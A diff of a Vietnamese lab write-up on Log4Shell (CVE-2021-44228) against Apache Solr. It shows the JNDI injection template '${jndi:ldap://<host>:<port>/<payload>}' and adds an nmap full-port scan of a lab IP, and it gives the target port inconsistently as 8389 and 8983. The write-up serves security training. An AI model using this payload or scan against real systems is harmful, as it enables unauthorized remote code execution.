@@ -72,6 +72,29 @@ ${jndi:ldap://<host>:<port>/<payload>}
 Trạng thái không sử dụng thiết bị IPS/IDS
 ![noIPSIDS](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/log4jlab.drawio.png)
 
+#### Enumeration
+Dùng **nmap** để scan port trên target
+```console
+nmap -sS -sV -sC -Pn -T4 -v -p- 192.168.2.44 -o re_nmap.txt
+```
+Kết quả
+![nmap](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/nmap1.PNG)
+
+Trong số các port đang mở, ta tập trung vào port 8389 đang chạy dịch vụ Apache Solr.
+Apache Solr là một nền tảng tìm kiếm và phân tích dữ liệu mã nguồn mở, được xây dựng trên cơ sở của Apache Lucene. Nó cung cấp các tính năng mạnh mẽ cho việc lập chỉ mục và tìm kiếm dữ liệu từ nhiều nguồn khác nhau, từ văn bản đến hình ảnh và tài liệu phức tạp.
+
+Solr sử dụng cổng 8983 làm cổng mặc định cho giao tiếp.
+![defaultport](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/defaultport.PNG)
+
+Log4Shell (CVE-2021-44228) liên quan đến lỗ hổng bảo mật trong thư viện Log4j, không phải trực tiếp đối với Apache Solr. Tuy nhiên, Apache Solr có thể sử dụng Log4j trong một số trường hợp, ví dụ như để ghi nhật ký (logging). Do đó, nếu Solr sử dụng Log4j và sử dụng các tính năng bị ảnh hưởng, thì nó có thể tiềm ẩn rủi ro bảo mật.
+
+Mục tiêu cần tìm ra những entry point có tiềm năng (log lại dữ liệu sau khi người dùng thực hiện truy vấn tại những entry point này)
+
+
+
+
+
+
 ### Biện pháp phòng ngừa
 
 Áp dụng thiết bị IPS/IDS 
